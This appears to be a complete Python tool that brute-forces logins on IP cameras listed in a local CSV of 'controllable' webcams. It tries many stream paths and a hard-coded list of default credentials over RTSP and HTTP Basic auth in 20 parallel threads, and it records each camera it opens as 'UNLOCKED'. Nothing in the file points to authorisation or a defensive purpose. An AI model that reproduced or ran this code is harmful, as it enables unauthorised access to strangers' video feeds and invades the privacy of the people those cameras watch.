"""RTSP brute for all IP cams in our CSV.

Uses common RTSP paths + common credentials.
Tries both RTSP_DESCRIBE and HTTP Basic on each cam.
"""
import csv
import re
import time
import socket
import json
import base64
import threading
import random
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter

CSV_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\controllable_Webcams.csv'
PROGRESS = r'C:\Users\eli6-admin\Documents\eli6-surveillance\data\rtsp_bf.json'
LOG = r'C:\Users\eli6-admin\Documents\eli6-surveillance\archive/logs\rtsp_bf.log'

# Common RTSP paths
RTSP_PATHS = [
    '/', '/live', '/live.sdp', '/live/main', '/live/sub',
    '/live/0/main', '/live/0/sub', '/live/1/main', '/live/1/sub',
    '/av0_0', '/av0_1', '/h264', '/h264/ch1/main/av_stream',
    '/mpeg4', '/video', '/video1', '/video2',
    '/11', '/12', '/13',  # Hipcam
    '/onvif/streaming/channels/101', '/onvif/streaming/channels/1',
    '/Streaming/tracks/101', '/streaming/channels/101',
    '/Streaming/Channels/101', '/streaming/tracks/1',
    '/cam/realmonitor', '/cam0_0', '/live/main', '/live/sub',
    '/ch01.264', '/ch01/0/main', '/ch01/0/sub',
    '/trackID=1', '/PSIA/Streaming/channels/101',
    '/axis-cgi/mjpg/video.cgi', '/axis-cgi/media/video.cgi',
    '/0/usrnm:pwd/0', '/1/usrnm:pwd/1',
    '/user=admin&password=&channel=1', '/live/0', '/live/1',
    '/stream1', '/stream2', '/stream3',
    '/ch0.h264', '/ch1.h264', '/ch0_0.h264', '/ch0_1.h264',
    '/0/main', '/0/sub', '/1/main', '/1/sub',
    '/video1+audio', '/video2+audio', '/video0+audio',
    '/ipcam_h264.sdp', '/ipcam_mjpeg.sdp',
    '/live/main/av_stream', '/live/sub/av_stream',
    '/h264/ch01/main/av_stream', '/h264/ch01/sub/av_stream',
    '/streaming/channels/1', '/streaming/channels/101',
    '/cam/realmonitor?channel=1&subtype=0',
    '/cam/realmonitor?channel=1&subtype=1',
    '/gopro/id=0', '/live/0', '/live/1',
    '/videos', '/flv', '/mp4',
    '/stream.sdp', '/test.sdp',
    '/mediastream', '/videoinput', '/videoinput_1',
    '/live.sdp', '/live2.sdp', '/live3.sdp',
]

# Common creds
CREDS = [
    ('', ''),
    ('admin', ''),
    ('admin', 'admin'),
    ('admin', '12345'),
    ('admin', '1234'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('admin', 'Admin12345'),
    ('admin', 'system'),
    ('admin', 'user'),
    ('root', 'root'),
    ('root', ''),
    ('user', 'user'),
    ('guest', 'guest'),
    ('operator', 'operator'),
    ('admin', '1234admin'),
    ('admin', 'admin1234'),
    ('admin', 'abcd1234'),
    ('admin', '12345abc'),
    ('admin', '7777'),
    ('admin', '4321'),
    ('admin', '9999'),
    ('admin', '0000'),
    ('admin', '1111'),
    ('admin', 'hik12345'),
    ('admin', 'Hik12345'),
    ('admin', '7ujMko0admin'),
    ('admin', 'vizxv'),
    ('admin', 'admin1'),
    ('root', 'pass'),
    ('root', '12345'),
    ('admin', 'abc123'),
    ('admin', 'qwert'),
    ('admin', 'pass1234'),
    ('root', 'root123'),
    ('admin', 'test'),
    ('admin', 'camera'),
    ('admin', 'monitor'),
    ('admin', 'supervisor'),
    ('admin', 'support'),
    ('admin', 'service'),
    ('admin', 'manager'),
    ('admin', 'default'),
    ('admin', 'changeme'),
]


def log(msg):
    line = f'[{time.strftime("%H:%M:%S")}] {msg}'
    print(line, flush=True)
    try:
        with open(LOG, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    except:
        pass


def try_rtsp(host, port, path, creds, timeout=4):
    """Try RTSP DESCRIBE with creds."""
    user, pwd = creds
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        if user:
            url = f'rtsp://{user}:{pwd}@{host}:{port}{path}'
        else:
            url = f'rtsp://{host}:{port}{path}'
        req = f'DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Test\r\nAccept: application/sdp\r\n\r\n'
        s.send(req.encode())
        data = s.recv(4096)
        s.close()
        if b'200 OK' in data:
            return 200
        if b'401' in data:
            return 401
        if b'404' in data:
            return 404
        return -1
    except Exception:
        return -1


def try_http(host, port, path, creds, timeout=4):
    """Try HTTP with Basic auth."""
    import urllib.request
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    user, pwd = creds
    try:
        url = f'http://{host}:{port}{path}'
        req = urllib.request.Request(url, headers={
            'User-Agent': 'Test',
        })
        if user:
            req.add_header('Authorization', 'Basic ' + base64.b64encode(f'{user}:{pwd}'.encode()).decode())
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return -1


def probe_cam(host, port):
    """Try common RTSP paths with common creds."""
    found = []
    for path in RTSP_PATHS[:8]:  # Top 8 paths
        for creds in CREDS[:6]:  # Top 6 creds
            status = try_rtsp(host, port, path, creds, timeout=3)
            if status == 200:
                found.append({'path': path, 'creds': creds, 'protocol': 'rtsp'})
                return found
            if status == 401:
                # Cam exists, just auth required
                # Try a few more creds
                for c2 in CREDS[6:20]:
                    if try_rtsp(host, port, path, c2, timeout=3) == 200:
                        found.append({'path': path, 'creds': c2, 'protocol': 'rtsp'})
                        return found
                # Try HTTP
                for c2 in CREDS[:10]:
                    h_status = try_http(host, 80, '/', c2, timeout=3)
                    if h_status == 200:
                        found.append({'path': '/', 'creds': c2, 'protocol': 'http'})
                        return found
    return found


def main():
    sys.stdout.reconfigure(line_buffering=True)
    csv.field_size_limit(2**31 - 1)
    log('[RTSP BF] Loading CSV...')

    # Get IP cams with RTSP port
    targets = []
    with open(CSV_PATH, 'r', encoding='utf-8', errors='replace', newline='') as f:
        for row in csv.DictReader(f):
            url = row.get('url', '') or ''
            lsurl = row.get('live_stream_url', '') or ''
            for u in [url, lsurl]:
                if not u or not u.startswith('rtsp://'):
                    continue
                m = re.match(r'rtsp://(?:[^@]+@)?(\d+\.\d+\.\d+\.\d+):?(\d+)?(/.*)?', u)
                if m:
                    ip = m.group(1)
                    port = int(m.group(2)) if m.group(2) else 554
                    path = m.group(3) or '/'
                    targets.append({
                        'ip': ip,
                        'port': port,
                        'path': path,
                        'url': u,
                    })
                    break

    log(f'  {len(targets):,} RTSP targets')

    # Load progress
    progress = {}
    if os.path.exists(PROGRESS):
        try:
            with open(PROGRESS) as f:
                progress = json.load(f)
        except:
            pass
    log(f'  {len(progress):,} already tested')

    to_test = [t for t in targets if t['url'] not in progress]
    log(f'  Need to test: {len(to_test):,}')

    if not to_test:
        log('  All done, sleeping 60s and re-checking...')
        time.sleep(60)
        # Re-load progress
        if os.path.exists(PROGRESS):
            try:
                with open(PROGRESS) as f:
                    progress = json.load(f)
            except:
                pass
        to_test = [t for t in targets if t['url'] not in progress]
        if not to_test:
            return

    t0 = time.time()
    n_done = 0
    n_unlocked = 0
    last_save = time.time()

    # Use 20 workers
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(probe_cam, t['ip'], t['port']): t for t in to_test}
        for f in as_completed(futures):
            t = futures[f]
            try:
                found = f.result(timeout=30)
            except Exception:
                found = []
            if found:
                progress[t['url']] = {
                    'unlocked': True,
                    'found': found,
                    'ip': t['ip'],
                    'port': t['port'],
                }
                n_unlocked += 1
                log(f'  UNLOCKED {t["url"]} -> {found}')
            else:
                progress[t['url']] = {'unlocked': False, 'ip': t['ip'], 'port': t['port']}

            n_done += 1
            if n_done % 20 == 0:
                elapsed = time.time() - t0
                rate = n_done / max(elapsed, 1)
                log(f'  {n_done:,}/{len(to_test):,} ({n_unlocked} unlocked) {rate:.1f}/s')
                with open(PROGRESS, 'w') as f:
                    json.dump(progress, f, indent=2)
                last_save = time.time()

        # Final save
        with open(PROGRESS, 'w') as f:
            json.dump(progress, f, indent=2)
        elapsed = time.time() - t0
        log(f'\n[DONE] {n_done:,} tested, {n_unlocked} unlocked, in {elapsed:.0f}s')


if __name__ == '__main__':
    main()
